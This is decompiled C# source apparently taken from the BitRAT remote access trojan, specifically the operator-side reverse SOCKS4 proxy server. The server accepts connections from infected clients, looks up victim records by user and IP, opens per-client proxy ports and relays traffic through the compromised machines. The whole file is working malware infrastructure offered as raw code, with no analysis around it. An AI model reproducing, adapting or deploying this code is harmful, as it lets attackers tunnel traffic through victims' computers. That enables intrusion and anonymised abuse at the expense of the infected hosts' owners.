﻿using System;
using System.Net;
using System.Net.Sockets;
using System.Text;
using System.Threading;

namespace BitRAT
{
	// Token: 0x020001E6 RID: 486
	public class cSocks4Server
	{
		// Token: 0x06001AE9 RID: 6889 RVA: 0x0000DC52 File Offset: 0x0000BE52
		public cSocks4Server()
		{
			this.MSG_START_ERR = string.Empty;
		}

		// Token: 0x06001AEA RID: 6890 RVA: 0x000BB184 File Offset: 0x000B9384
		private bool QueryProxy(Socket s_recv, Socket s_send)
		{
			byte[] buffer = new byte[8192];
			byte[] bytes = BitConverter.GetBytes(0);
			bool result = true;
			try
			{
				if (s_recv.IOControl(IOControlCode.DataToRead, null, bytes) == 0)
				{
					result = false;
					goto IL_F1;
				}
			}
			catch (Exception ex)
			{
				result = false;
				goto IL_F1;
			}
			if (s_recv.Connected)
			{
				s_recv.ReceiveTimeout = 10000;
				s_send.SendTimeout = 10000;
				while (s_recv.Available > 0 & Class130.struct18_2.method_0())
				{
					s_recv.ReceiveTimeout = 5000;
					int num = s_recv.Receive(buffer);
					if (num < 1)
					{
						result = false;
						goto IL_F1;
					}
					if (num > 0)
					{
						try
						{
							s_recv.SendTimeout = 5000;
							if (s_send.Send(buffer, num, SocketFlags.None) < 1)
							{
								result = false;
								goto IL_F1;
							}
						}
						catch (Exception ex2)
						{
						}
						IL_EB:
						return result;
					}
					if (!this.IS_CONNECTED(s_recv) | !this.IS_CONNECTED(s_send))
					{
						result = false;
						goto IL_F1;
					}
					Thread.Sleep(1);
				}
				goto IL_EB;
			}
			result = false;
			IL_F1:
			try
			{
				s_recv.Shutdown(SocketShutdown.Both);
				s_send.Shutdown(SocketShutdown.Both);
			}
			catch (Exception ex3)
			{
			}
			s_recv.Close();
			s_send.Close();
			return result;
		}

		// Token: 0x06001AEB RID: 6891 RVA: 0x000BB2D8 File Offset: 0x000B94D8
		private void ClientConnectionThread(ref cSocks4Server.Struct30 cci)
		{
			Socket socket = null;
			cSocks4Server.Struct30 @struct = cci;
			try
			{
				socket = cci.socket_1.Accept();
				goto IL_CC;
			}
			catch (Exception ex)
			{
				Console.WriteLine("ClientConnectionThread: cci.clientSOCKET_REVERSE_PROXY_SOCKET.Accept() failed!");
				return;
			}
			IL_35:
			Thread.Sleep(1);
			if ((!socket.Connected | !@struct.socket_0.Connected) || (socket.Poll(5000, SelectMode.SelectRead) & socket.Available == 0) || (@struct.socket_0.Poll(5000, SelectMode.SelectRead) & @struct.socket_0.Available == 0) || (!this.IS_CONNECTED(socket) | !this.IS_CONNECTED(@struct.socket_0)) || !this.QueryProxy(@struct.socket_0, socket) || !this.QueryProxy(socket, @struct.socket_0))
			{
				try
				{
					@struct.socket_0.Shutdown(SocketShutdown.Both);
					socket.Shutdown(SocketShutdown.Both);
				}
				catch (Exception ex2)
				{
				}
				@struct.socket_0.Close();
				socket.Close();
				return;
			}
			IL_CC:
			if (!Class130.struct18_2.method_0())
			{
				return;
			}
			goto IL_35;
		}

		// Token: 0x06001AEC RID: 6892 RVA: 0x000BB414 File Offset: 0x000B9614
		private bool StartServer(int port, ref Socket s, ref IPEndPoint ep)
		{
			IPAddress any = IPAddress.Any;
			ep.Port = port;
			try
			{
				s = new Socket(any.AddressFamily, SocketType.Stream, ProtocolType.Tcp);
				s.Bind(ep);
				s.Listen(int.MaxValue);
			}
			catch (Exception ex)
			{
				return false;
			}
			return true;
		}

		// Token: 0x06001AED RID: 6893 RVA: 0x000BB478 File Offset: 0x000B9678
		private void ClientThread(ref Socket sck, bool new_client)
		{
			Socket socket = sck;
			Socket socket2 = null;
			Socket socket_ = null;
			Socket socket3 = null;
			byte[] array = new byte[128];
			IPEndPoint ipendPoint = (IPEndPoint)socket.LocalEndPoint;
			string str = ((IPEndPoint)socket.RemoteEndPoint).Address.ToString();
			Console.WriteLine("Client " + str + " connected");
			ipendPoint.Address = IPAddress.Any;
			if (!this.StartServer(0, ref socket2, ref ipendPoint))
			{
				Console.WriteLine("ClientThread: StartServer for proxySocket failed!");
			}
			else
			{
				string text = ((IPEndPoint)socket2.LocalEndPoint).Port.ToString();
				Console.WriteLine("Client " + str + " proxy port = " + text);
				if (!new_client)
				{
					goto IL_2B5;
				}
				Thread.Sleep(100);
				try
				{
					int num;
					while (num == 0 & Class130.struct18_2.method_0())
					{
						num = socket.Receive(array);
						if (num < 1)
						{
							Console.WriteLine("ClientThread: Receive failed!");
							goto IL_2D0;
						}
					}
					string @string = Encoding.UTF8.GetString(array, 0, num);
					Class130.fSocks4R_0.method_0(@string, Class130.concurrentDictionary_3[@string].sUser, Class130.concurrentDictionary_3[@string].sIP, text);
					string text2 = @string;
					string string_ = "socks4r_port|" + text;
					string string_2 = text2;
					Class136.Class138 @class = new Class136.Class138();
					@class.string_0 = string_2;
					@class.string_1 = string_;
					@class.long_0 = 0L;
					try
					{
						if (Class130.concurrentDictionary_3.ContainsKey(@class.string_0))
						{
							new Thread(new ThreadStart(@class._Lambda$__0)).Start();
						}
					}
					catch (Exception ex)
					{
					}
					goto IL_2B5;
				}
				catch (Exception ex2)
				{
					Console.WriteLine("ClientThread: Receive exception!");
					goto IL_2D0;
				}
				IL_1C0:
				cSocks4Server.Class154 class2 = new cSocks4Server.Class154(class2);
				class2.cSocks4Server_0 = this;
				if (!this.IS_CONNECTED(socket))
				{
					goto IL_2D0;
				}
				try
				{
					socket_ = socket2.Accept();
				}
				catch (Exception ex3)
				{
					Console.WriteLine("ClientThread: proxySocket.Accept() failed!");
					goto IL_2D0;
				}
				if (!socket.Connected)
				{
					goto IL_2D0;
				}
				if (!this.StartServer(0, ref socket3, ref ipendPoint))
				{
					Console.WriteLine("ClientThread: StartServer for clientSOCKET_REVERSE_PROXY_SOCKET failed!");
					goto IL_2D0;
				}
				try
				{
					ipendPoint = (IPEndPoint)socket3.LocalEndPoint;
					socket.SendTimeout = 10000;
					if (socket.Send(Encoding.UTF8.GetBytes(ipendPoint.Port.ToString())) < 1)
					{
						goto IL_2D0;
					}
				}
				catch (Exception ex4)
				{
					Console.WriteLine("ClientThread: Send failed!");
					goto IL_2D0;
				}
				class2.struct30_0 = default(cSocks4Server.Struct30);
				class2.struct30_0.socket_1 = socket3;
				class2.struct30_0.socket_0 = socket_;
				new Thread(new ThreadStart(class2._Lambda$__0)).Start();
				Thread.Sleep(1);
				IL_2B5:
				if (Class130.struct18_2.method_0())
				{
					goto IL_1C0;
				}
			}
			IL_2D0:
			try
			{
				socket2.Shutdown(SocketShutdown.Both);
				socket.Shutdown(SocketShutdown.Both);
			}
			catch (Exception ex5)
			{
			}
			socket2.Close();
			socket.Close();
		}

		// Token: 0x06001AEE RID: 6894 RVA: 0x000BB7C0 File Offset: 0x000B99C0
		private bool IS_CONNECTED(Socket tcpSocket)
		{
			bool blocking = tcpSocket.Blocking;
			bool result = false;
			try
			{
				byte[] buffer = new byte[1];
				tcpSocket.Blocking = false;
				tcpSocket.Send(buffer, 0, SocketFlags.None);
				result = true;
			}
			catch (SocketException ex)
			{
				if (ex.NativeErrorCode.Equals(10035))
				{
					result = true;
				}
				else
				{
					result = false;
				}
			}
			finally
			{
				tcpSocket.Blocking = blocking;
			}
			return result;
		}

		// Token: 0x06001AEF RID: 6895 RVA: 0x000BB848 File Offset: 0x000B9A48
		public int Start(int port)
		{
			try
			{
				IPEndPoint ipendPoint = new IPEndPoint(IPAddress.Any, port);
				if (!this.StartServer(port, ref Class130.socket_0, ref ipendPoint))
				{
					Console.WriteLine("Reverse SOCKS 4 Server Failed!");
					return 0;
				}
				ipendPoint = (IPEndPoint)Class130.socket_0.LocalEndPoint;
				Console.WriteLine("Reverse SOCKS 4 Server Started! Listening on port " + ipendPoint.Port.ToString());
				this.PORT_MAIN = ipendPoint.Port;
				new Thread(delegate()
				{
					this.StartSocket();
				}).Start();
			}
			catch (Exception ex)
			{
				this.MSG_START_ERR = ex.Message;
			}
			return this.PORT_MAIN;
		}

		// Token: 0x06001AF0 RID: 6896 RVA: 0x000BB904 File Offset: 0x000B9B04
		private void StartSocket()
		{
			while (Class130.struct18_2.method_0())
			{
				try
				{
					cSocks4Server.Class155 @class = new cSocks4Server.Class155(@class);
					@class.cSocks4Server_0 = this;
					@class.socket_0 = Class130.socket_0.Accept();
					new Thread(new ThreadStart(@class._Lambda$__0)).Start();
				}
				catch (Exception ex)
				{
					break;
				}
			}
			try
			{
				Class130.socket_0.Shutdown(SocketShutdown.Both);
			}
			catch (Exception ex2)
			{
			}
			Class130.socket_0.Close();
		}

		// Token: 0x04000A4E RID: 2638
		public int PORT_MAIN;

		// Token: 0x04000A4F RID: 2639
		public string MSG_START_ERR;

		// Token: 0x020001E7 RID: 487
		internal sealed class Class154
		{
			// Token: 0x06001AF2 RID: 6898 RVA: 0x0000DC6D File Offset: 0x0000BE6D
			public Class154(cSocks4Server.Class154 class154_0)
			{
				if (class154_0 != null)
				{
					this.struct30_0 = class154_0.struct30_0;
				}
			}

			// Token: 0x06001AF3 RID: 6899 RVA: 0x0000DC84 File Offset: 0x0000BE84
			internal void _Lambda$__0()
			{
				this.cSocks4Server_0.ClientConnectionThread(ref this.struct30_0);
			}

			// Token: 0x04000A50 RID: 2640
			public cSocks4Server.Struct30 struct30_0;

			// Token: 0x04000A51 RID: 2641
			public cSocks4Server cSocks4Server_0;
		}

		// Token: 0x020001E8 RID: 488
		internal sealed class Class155
		{
			// Token: 0x06001AF4 RID: 6900 RVA: 0x0000DC97 File Offset: 0x0000BE97
			public Class155(cSocks4Server.Class155 class155_0)
			{
				if (class155_0 != null)
				{
					this.socket_0 = class155_0.socket_0;
				}
			}

			// Token: 0x06001AF5 RID: 6901 RVA: 0x0000DCAE File Offset: 0x0000BEAE
			internal void _Lambda$__0()
			{
				this.cSocks4Server_0.ClientThread(ref this.socket_0, true);
			}

			// Token: 0x04000A52 RID: 2642
			public Socket socket_0;

			// Token: 0x04000A53 RID: 2643
			public cSocks4Server cSocks4Server_0;
		}

		// Token: 0x020001E9 RID: 489
		private struct Struct30
		{
			// Token: 0x04000A54 RID: 2644
			public Socket socket_0;

			// Token: 0x04000A55 RID: 2645
			public Socket socket_1;
		}
	}
}
